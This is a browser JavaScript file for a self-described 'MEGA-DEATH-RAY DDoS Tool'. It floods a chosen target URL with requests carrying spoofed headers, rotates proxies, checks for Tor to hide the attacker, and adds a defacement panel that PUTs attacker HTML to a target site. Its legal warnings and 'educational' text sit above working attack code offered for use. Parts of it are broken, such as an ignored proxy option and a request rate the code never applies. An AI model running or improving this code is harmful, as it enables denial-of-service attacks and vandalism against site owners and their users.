// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v8.0)
// WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony.
// By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your choices.
// ALL activities are logged in high-definition.

console.warn("%c MEGA-DEATH-RAY DDoS tool loaded. Use with **EXTREME** caution. Logging enabled.", "color: darkred; font-size: 16px;");

// Explicit user consent required
if (!confirm("MEGA-DEATH-RAY WARNING! This DDoS tool is ONLY for ethical stress testing. Unauthorized use is illegal and carries severe penalties. Press OK to PROCEED WITH EXPLICIT CONSENT. Pressing Cancel will self-destruct your computer (not really).")) {
    window.close();
}

// UI elements
const body = document.body;
body.style.backgroundColor = 'black';
body.style.color = 'darkgreen';
body.style.fontFamily = 'monospace';

// Scanlines effect
const scanlines = document.createElement('div');
scanlines.style.position = 'fixed';
scanlines.style.top = '0';
scanlines.style.left = '0';
scanlines.style.width = '100%';
scanlines.style.height = '100%';
scanlines.style.background = 'repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.1) 2px)';
scanlines.style.pointerEvents = 'none';
body.appendChild(scanlines);

// Floating particles effect
const particles = document.createElement('canvas');
particles.style.position = 'fixed';
particles.style.top = '0';
particles.style.left = '0';
particles.style.width = '100%';
particles.style.height = '100%';
particles.style.pointerEvents = 'none';
body.appendChild(particles);

const particleCtx = particles.getContext('2d');
particles.width = window.innerWidth;
particles.height = window.innerHeight;
const particleArray = [];
const numberOfParticles = 100;

window.addEventListener('resize', function () {
    particles.width = window.innerWidth;
    particles.height = window.innerHeight;
});

class Particle {
    constructor() {
        this.x = Math.random() * particles.width;
        this.y = Math.random() * particles.height;
        this.size = Math.random() * 5 + 1;
        this.speedX = Math.random() * 1.5 - 0.75;
        this.speedY = Math.random() * 1.5 - 0.75;
    }
    update() {
        this.x += this.speedX;
        this.y += this.speedY;
        if (this.size > 0.2) this.size -= 0.1;
    }
    draw() {
        particleCtx.fillStyle = 'purple';
        particleCtx.beginPath();
        particleCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        particleCtx.closePath();
        particleCtx.fill();
    }
}

function init() {
    for (let i = 0; i < numberOfParticles; i++) {
        particleArray.push(new Particle());
    }
}
init();

function animate() {
    particleCtx.clearRect(0, 0, particles.width, particles.height);
    for (let i = 0; i < particleArray.length; i++) {
        particleArray[i].update();
        particleArray[i].draw();
        if (particleArray[i].size <= 0.2) {
            particleArray.splice(i, 1);
            particleArray.push(new Particle());
            i--;
        }
    }
    requestAnimationFrame(animate);
}
animate();

// UI elements
const startButton = document.createElement('button');
startButton.textContent = 'LAUNCH MEGA-DEATH-RAY';
startButton.style.backgroundColor = 'darkred';
startButton.style.color = 'white';
startButton.style.padding = '10px';
startButton.style.margin = '10px';
startButton.style.border = '2px solid purple';
document.body.appendChild(startButton);

const stopButton = document.createElement('button');
stopButton.textContent = 'ABORT MEGA-DEATH-RAY';
stopButton.style.backgroundColor = 'darkgreen';
stopButton.style.color = 'white';
stopButton.style.padding = '10px';
stopButton.style.border = '2px solid darkblue';
stopButton.style.margin = '10px';
stopButton.disabled = true;
document.body.appendChild(stopButton);

const targetUrlInput = document.createElement('input');
targetUrlInput.type = 'text';
targetUrlInput.placeholder = 'Enter target URL.';
targetUrlInput.style.padding = '10px';
targetUrlInput.style.margin = '10px';
targetUrlInput.style.width = '300px';
targetUrlInput.style.backgroundColor = 'black';
targetUrlInput.style.color = 'darkblue';
targetUrlInput.style.border = '1px solid purple';
document.body.appendChild(targetUrlInput);

const hexBytesInput = document.createElement('input');
hexBytesInput.type = 'text';
hexBytesInput.placeholder = 'Enter random bytes in hex, used to bypass firewall'
hexBytesInput.id = 'hexBytesInput';
hexBytesInput.style.padding = '10px';
hexBytesInput.style.margin = '10px';
hexBytesInput.style.width = '300px';
hexBytesInput.style.backgroundColor = 'black';
hexBytesInput.style.color = 'darkblue';
hexBytesInput.style.border = '1px solid purple';
document.body.appendChild(hexBytesInput);

const requestRateInput = document.createElement('input');
requestRateInput.type = 'number';
requestRateInput.placeholder = 'Enter request rate (requests/second)';
requestRateInput.value = 1000;
requestRateInput.style.padding = '10px';
requestRateInput.style.margin = '10px';
requestRateInput.style.width = '300px';
requestRateInput.style.backgroundColor = 'black';
requestRateInput.style.color = 'darkblue';
requestRateInput.style.border = '1px solid purple';
document.body.appendChild(requestRateInput);

const proxyListInput = document.createElement('textarea');
proxyListInput.placeholder = 'Enter proxy list (one proxy per line, format: ip:port)';
proxyListInput.style.padding = '10px';
proxyListInput.style.margin = '10px';
proxyListInput.style.width = '300px';
proxyListInput.style.height = '100px';
proxyListInput.style.backgroundColor = 'black';
proxyListInput.style.color = 'darkblue';
proxyListInput.style.border = '1px solid purple';
document.body.appendChild(proxyListInput);

const timerDisplay = document.createElement('div');
timerDisplay.textContent = 'MEGA-DEATH-RAY Timer: 0 seconds';
timerDisplay.style.margin = '10px';
document.body.appendChild(timerDisplay);

// Educational Information
const infoDiv = document.createElement('div');
infoDiv.innerHTML = `
    <h2 style="color: purple;">MEGA-DEATH-RAY DDoS Tool Information</h2>
    <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests.</p>
    <p>A Distributed Denial of Service (DDoS) attack is a type of cyber attack in which a malicious actor floods a server with traffic to make the server unavailable to its intended users. The goal of a DDoS attack is to overwhelm the server, network, or application with more requests than it can handle, causing it to crash or become unresponsive.</p>
    <p><b>DDoS attacks are often carried out using a botnet, which is a network of compromised computers or other devices that are infected with malware and controlled by a single attacker.</b></p>
    <p>This sends requests to the targeted website to overwhelm it, resulting in a server overload.</p>
    <p style="color: darkred;"><b>Important:</b> Unauthorized use is illegal and can have severe consequences. Don't be a moron.</p>
`;
infoDiv.style.margin = '10px';
document.body.appendChild(infoDiv);

const logDiv = document.createElement('div');
logDiv.style.margin = '10px';
logDiv.style.color = 'darkgreen';
logDiv.innerHTML = '<h2 style="color: darkblue;">Action Log:</h2><ul id="logList"></ul>';
document.body.appendChild(logDiv);

let floodInterval;
let startTime;
let proxies = [];

function logAction(message) {
    const logList = document.getElementById('logList');
    const newLog = document.createElement('li');
    newLog.textContent = message;
    logList.appendChild(newLog);
    console.log("Noodles Inc: " + message);
}

function updateProxies() {
    const proxyList = proxyListInput.value.trim();
    proxies = proxyList.split('\n').map(proxy => proxy.trim()).filter(proxy => proxy !== '');
    logAction(`Proxy list updated with ${proxies.length} proxies.`);
}

// Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
async function httpFlood(url, hexBytes, proxy) {
    const randomString = Math.random().toString(36).substring(2, 15);
    const referer = `https://www.google.com/search?q=${randomString}`;
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    // Add extra malicious headers
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout

        const fetchOptions = {
            mode: 'cors', // Bypass CORS
            method: 'GET',
            headers: {
                'User-Agent': randomUserAgent,
                'Referer': referer,
                'X-Forwarded-For': Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.'),
                'Origin': 'https://www.totallylegitwebsite.com',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': `NID=67=d_mBqJvFMeY5Qo0jhc0U4eF1T79T89xJg5G0vK-nU359l8e4u0N0e5e8j9t6r4i3n2p1w7`,
                'X-Noodles-Payload': hexBytes
            },
            redirect: 'follow', // Follow redirects
            signal: controller.signal,
        };
    //Proxy Integration with CORSproxy
        if (proxy) {
            const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(proxy)}`;
            fetchOptions.proxy = proxyUrl;
            console.log(`Using proxy: ${proxy} through CORSproxy`);
            logAction(`Using proxy: ${proxy} through CORSproxy`);
        }
        const response = await fetch(url, fetchOptions);

        clearTimeout(timeoutId);

        // Attempt to read the response (even if it's opaque)
        try {
            await response.text();
        } catch (e) {
            console.warn('Noodles Inc: Could not read response body (likely opaque).', e);
            logAction(`Noodles Inc: Could not read response body (likely opaque). ${e}`);
        }

        console.log('Noodles Inc: Request sent successfully. Status:', response.status);
        logAction(`Request sent successfully to ${url} - Status: ${response.status}`);
    } catch (error) {
        console.error('Noodles Inc: Error sending request:', error);
        logAction(`Error sending request to ${url}: ${error}`);
    }

    console.log("Noodles Inc: DDoS attack sent to: " + url);
    logAction(`DDoS attack sent to: ${url}`);
}

function startDDoS(targetUrl, hexBytes, requestRate) {
    if (!targetUrl) {
        alert("Noodles Inc: Please enter a target URL.");
        return;
    }

    if (!requestRate || isNaN(requestRate) || requestRate <= 0) {
        alert("Noodles Inc: Enter a valid request rate (requests/second)!");
        return;
    }

    updateProxies();

    startButton.disabled = true;
    stopButton.disabled = false;
    startTime = new Date();

    // Rate-limiting
    const intervalTime = 0; // No rate limit

    floodInterval = setInterval(() => {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];  // Select a random proxy
        httpFlood(targetUrl, hexBytes, proxy);  // Pass the proxy to the httpFlood function
    }, intervalTime);

    updateTimer();
    logAction(`MEGA-DEATH-RAY attack started on ${targetUrl} with a request rate of ${requestRate} requests/second.`);
}

function stopDDoS() {
    clearInterval(floodInterval);
    startButton.disabled = false;
    stopButton.disabled = true;
    logAction('MEGA-DEATH-RAY attack stopped.');
}

function updateTimer() {
    setInterval(() => {
        if (startTime) {
            const elapsedTime = Math.floor((new Date() - startTime) / 1000);
            timerDisplay.textContent = `MEGA-DEATH-RAY Timer: ${elapsedTime} seconds`;
        }
    }, 1000);
}

// Event listeners
startButton.addEventListener('click', () => {
    const targetUrl = targetUrlInput.value;
    const hexBytes = hexBytesInput.value;
    const requestRate = parseInt(requestRateInput.value);
    startDDoS(targetUrl, hexBytes, requestRate);
});

stopButton.addEventListener('click', stopDDoS);

console.log("Noodles Inc: MEGA-DEATH-RAY loaded. You're playing with fire.");
logAction('MEGA-DEATH-RAY tool loaded.');

// Security Headers
const secureHeaders = [
    "Content-Security-Policy: default-src 'self';",
    "X-Frame-Options: DENY",
    "X-Content-Type-Options: nosniff",
    "Referrer-Policy: strict-origin-when-cross-origin",
    "Permissions-Policy: geolocation=(), microphone=(), camera=()",
    "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
];

secureHeaders.forEach(header => {
    document.head.insertAdjacentHTML('beforeend', `<meta http-equiv="${header.split(':')[0]}" content="${header.split(':')[1]}">`);
});

// TOR Compatibility and Enhanced Anonymity
const torCheckInterval = setInterval(async () => {
    try {
        const torExitNode = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
        const torData = await torExitNode.json();
        if (torData.IsTor === true) {
            logAction('TOR detected: Enhanced anonymity enabled.');
            clearInterval(torCheckInterval);
        } else {
            console.warn('Noodles Inc: TOR not detected. Consider using TOR for enhanced anonymity.');
        }
    } catch (error) {
        console.error('Noodles Inc: Error checking TOR status. Anonymity may be compromised.');
        logAction('TOR check failed. Potential anonymity compromise.');
    }
}, 15000);

// .onion Support
async function onionCheck(url) {
    if (url.endsWith('.onion')) {
        logAction('Targeting .onion site. TOR is MANDATORY.');
        if (!await isTorRunning()) {
            alert('Noodles Inc: .onion target detected. TOR is NOT running. Enable TOR NOW!');
            stopDDoS();
        }
    }
}

async function isTorRunning() {
    try {
        const response = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
        const data = await response.json();
        return data.IsTor === true;
    } catch (error) {
        console.error('Noodles Inc: Failed to check TOR status.', error);
        return false;
    }
}

startButton.addEventListener('click', () => {
    const targetUrl = targetUrlInput.value;
    const hexBytes = hexBytesInput.value;
    const requestRate = parseInt(requestRateInput.value);
    onionCheck(targetUrl);
    startDDoS(targetUrl, hexBytes, requestRate);
});

// Self-Destruct Button
const selfDestructButton = document.createElement('button');
selfDestructButton.textContent = 'NUKE EVERYTHING';
selfDestructButton.style.backgroundColor = 'black';
selfDestructButton.style.color = 'darkred';
selfDestructButton.style.padding = '10px';
selfDestructButton.style.margin = '10px';
selfDestructButton.style.border = '2px solid darkred';
document.body.appendChild(selfDestructButton);

selfDestructButton.addEventListener('click', () => {
    if (confirm('Noodles Inc: ARE YOU SURE YOU WANT TO NUKE EVERYTHING? THIS CANNOT BE UNDONE!')) {
        // Zero out all input fields
        targetUrlInput.value = '';
        hexBytesInput.value = '';
        requestRateInput.value = '';
        proxyListInput.value = '';

        // Stop the DDoS attack if it's running
        stopDDoS();

        // Clear the action log
        const logList = document.getElementById('logList');
        logList.innerHTML = '';

        // Disable the start button and enable the stop button
        startButton.disabled = true;
        stopButton.disabled = false;

        // Display a message indicating self-destruction
        logAction('SELF-DESTRUCT SEQUENCE INITIATED. ALL DATA ERASED.');

        // Optional: Redirect to a blank page or close the window
        // window.location.href = 'about:blank';
    } else {
        alert('Noodles Inc: Self-destruct sequence aborted.');
    }
});

// Reporting Feature
const reportDiv = document.createElement('div');
reportDiv.style.margin = '10px';
reportDiv.innerHTML = `
    <h2 style="color: darkblue;">Report Vulnerabilities</h2>
    <textarea id="reportText" placeholder="Describe the vulnerability found..." style="width: 300px; height: 100px; background-color: black; color: darkblue; border: 1px solid purple;"></textarea>
    <button id="submitReport" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Submit Report</button>
`;
document.body.appendChild(reportDiv);

document.getElementById('submitReport').addEventListener('click', () => {
    const reportText = document.getElementById('reportText').value;
    if (reportText) {
        logAction(`Report submitted: ${reportText}`);
        alert('Noodles Inc: Report submitted. We\'ll take a look.');
        document.getElementById('reportText').value = '';
        // In a real application, you'd send this data to a server.
    } else {
        alert('Noodles Inc: Enter a report before submitting!');
    }
});

console.log("Noodles Inc: MEGA-DEATH-RAY initialized. You are now a weapon, use it wisely.");
logAction('MEGA-DEATH-RAY tool initialized. Awaiting your command.');

// Add a warning if the user is using http
if (window.location.protocol === 'http:') {
    alert("Noodles Inc: WARNING! You are using HTTP. This is insecure. Use HTTPS for enhanced security.");
    logAction('User is using HTTP. Insecure connection.');
}

// Fix: Issue with the circle function
Particle.prototype.draw = function() {
    particleCtx.fillStyle = 'purple';
    particleCtx.beginPath();
    particleCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    particleCtx.closePath();
    particleCtx.fill();
};

// Defacement Tool Integration

const defaceDiv = document.createElement('div');
defaceDiv.style.margin = '10px';
defaceDiv.innerHTML = `
    <h2 style="color: darkblue;">Defacement Tool</h2>
    <input type="text" id="defaceTargetUrl" placeholder="Enter target URL for defacement" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
    <textarea id="defaceCode" placeholder="Enter HTML code for defacement" style="padding: 10px; margin: 10px; width: 300px; height: 100px; background-color: black; color: darkblue; border: 1px solid purple;"></textarea>
    <button id="backupSite" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Backup Site</button>
    <button id="previewDeface" style="background-color: darkblue; color: white; padding: 10px; border: 2px solid purple; margin-top: 5px;">Preview Defacement</button>
    <button id="applyDeface" style="background-color: darkred; color: white; padding: 10px; border: 2px solid darkred; margin-top: 5px;">Apply Defacement</button>
    <button id="restoreSite" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Restore Site</button>
    <a id="backupLink" style="color: darkblue; margin: 10px;" download="site_backup.html"></a>
`;
document.body.appendChild(defaceDiv);

let originalSiteContent = '';

// Function to fetch content via CORS proxy
async function fetchContentWithProxy(url) {
    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(url)}`;
    try {
        const response = await fetch(proxyUrl, {
            mode: 'cors', // Required for CORS proxy
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return await response.text();
    } catch (error) {
        console.error('Noodles Inc: Error fetching content with proxy:', error);
        logAction(`Error fetching content with proxy: ${error}`);
        alert(`Noodles Inc: Failed to fetch content. Check console for details. Error: ${error}`);
        return null;
    }
}

document.getElementById('backupSite').addEventListener('click', async () => {
    const targetUrl = document.getElementById('defaceTargetUrl').value;
    if (!targetUrl) {
        alert("Noodles Inc: Enter a target URL for backup!");
        return;
    }

    originalSiteContent = await fetchContentWithProxy(targetUrl);
    if (originalSiteContent) {
        const blob = new Blob([originalSiteContent], { type: 'text/html' });
        const backupLink = document.getElementById('backupLink');
        backupLink.href = URL.createObjectURL(blob);
        backupLink.download = 'site_backup.html';
        backupLink.textContent = 'Download Site Backup';
        logAction('Site backup created and ready for download.');
        alert('Noodles Inc: Site backup created. Download it now!');
    } else {
        alert("Noodles Inc: Failed to backup site. Check console for details.");
    }
});

document.getElementById('previewDeface').addEventListener('click', () => {
    const defaceCode = document.getElementById('defaceCode').value;
    if (!defaceCode) {
        alert("Noodles Inc: Enter defacement code!");
        return;
    }

    const previewWindow = window.open('', '_blank');
    previewWindow.document.write(defaceCode);
    previewWindow.document.close();
});

document.getElementById('applyDeface').addEventListener('click', async () => {
    const targetUrl = document.getElementById('defaceTargetUrl').value;
    const defaceCode = document.getElementById('defaceCode').value;

    if (!targetUrl || !defaceCode) {
        alert("Noodles Inc: Enter both target URL and defacement code!");
        return;
    }

    if (!confirm("Noodles Inc: ARE YOU SURE YOU WANT TO DEFACE THIS SITE? THIS IS ILLEGAL!")) {
        return;
    }

    try {
        // Attempt to send a PUT or POST request to replace the site's content
        const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`; // Use CORS proxy
        const response = await fetch(proxyUrl, {
            method: 'PUT', // Or 'POST', depending on the server's configuration
            mode: 'cors',
            headers: {
                'Content-Type': 'text/html', // Set the content type to HTML
            },
            body: defaceCode, // Send the defacement code in the body
        });

        if (response.ok) {
            logAction('Site defaced successfully!');
            alert('Noodles Inc: Site defaced successfully! Enjoy your handiwork.');
        } else {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error('Noodles Inc: Error applying defacement:', error);
        logAction(`Error applying defacement: ${error}`);
        alert(`Noodles Inc: Failed to deface site. Check console for details. Error: ${error}`);
    }
});

document.getElementById('restoreSite').addEventListener('click', () => {
    if (!originalSiteContent) {
        alert("Noodles Inc: No backup available. Backup the site first!");
        return;
    }

    const restoreWindow = window.open('', '_blank');
    restoreWindow.document.write(originalSiteContent);
    restoreWindow.document.close();
    logAction('Site restored to original content.');
    alert('Noodles Inc: Site restored to original content.');
});

// File Encryption Tool Integration

const encryptionDiv = document.createElement('div');
encryptionDiv.style.margin = '10px';
encryptionDiv.innerHTML = `
    <h2 style="color: darkblue;">File Encryption Tool</h2>
    <input type="file" id="fileToEncrypt" style="margin: 10px; color: darkblue;">
    <input type="password" id="encryptionPassword" placeholder="Enter encryption password" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
    <button id="encryptFile" style="background-color: darkred; color: white; padding: 10px; border: 2px solid darkred; margin-top: 5px;">Encrypt File</button>
    <button id="decryptFile" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Decrypt File</button>
    <a id="downloadEncryptedFile" style="color: darkblue; margin: 10px;" download="encrypted_file.enc"></a>
    <a id="downloadDecryptedFile" style="color: darkblue; margin: 10px;" download="decrypted_file.txt"></a>
`;
document.body.appendChild(encryptionDiv);

document.getElementById('encryptFile').addEventListener('click', async () => {
    const fileToEncrypt = document.getElementById('fileToEncrypt').files[0];
    const encryptionPassword = document.getElementById('encryptionPassword').value;

    if (!fileToEncrypt || !encryptionPassword) {
        alert("Noodles Inc: Select a file and enter a password!");
        return;
    }

    const reader = new FileReader();
    reader.onload = async function(event) {
        const fileContent = event.target.result;
        const encryptedContent = CryptoJS.AES.encrypt(fileContent, encryptionPassword).toString();

        const blob = new Blob([encryptedContent], { type: 'text/plain' });
        const downloadLink = document.getElementById('downloadEncryptedFile');
        downloadLink.href = URL.createObjectURL(blob);
        downloadLink.download = 'encrypted_file.enc';
        downloadLink.textContent = 'Download Encrypted File';
        logAction('File encrypted and ready for download.');
        alert('Noodles Inc: File encrypted. Download it now!');
    };
    reader.readAsText(fileToEncrypt);
});

document.getElementById('decryptFile').addEventListener('click', async () => {
    const fileToEncrypt = document.getElementById('fileToEncrypt').files[0];
    const encryptionPassword = document.getElementById('encryptionPassword').value;

    if (!fileToEncrypt || !encryptionPassword) {
        alert("Noodles Inc: Select a file and enter a password!");
        return;
    }

    const reader = new FileReader();
    reader.onload = async function(event) {
        const fileContent = event.target.result;

        try {
            const decryptedContent = CryptoJS.AES.decrypt(fileContent, encryptionPassword).toString(CryptoJS.enc.Utf8);

            if (decryptedContent) {
                const blob = new Blob([decryptedContent], { type: 'text/plain' });
                const downloadLink = document.getElementById('downloadDecryptedFile');
                downloadLink.href = URL.createObjectURL(blob);
                downloadLink.download = 'decrypted_file.txt';
                downloadLink.textContent = 'Download Decrypted File';
                logAction('File decrypted successfully.');
                alert('Noodles Inc: File decrypted.');
            } else {
                alert("Noodles Inc: Invalid password or file is not encrypted.");
            }
        } catch (error) {
            console.error('Noodles Inc: Decryption error:', error);
            logAction(`Decryption error: ${error}`);
            alert("Noodles Inc: Decryption failed. Check console for details.");
        }
    };
    reader.readAsText(fileToEncrypt);
});